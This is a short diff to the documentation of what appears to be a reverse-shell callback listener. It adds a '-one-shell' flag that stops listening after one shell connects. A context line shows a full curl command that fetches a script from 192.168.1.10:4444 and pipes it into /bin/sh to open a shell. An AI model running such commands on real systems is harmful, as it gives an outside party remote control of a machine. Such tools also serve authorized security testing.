@@ -142,6 +142,13 @@ To get a shell:
 curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c' | /bin/sh
 ```
 
+`-one-shell`
+------------
+Stop listening after a shell has connected.
+
+Handy for having multiple shells at once without having to work out which port
+to use.
+
 `-print-default-template`
 -------------------------
 Prints the default callback script template.  See
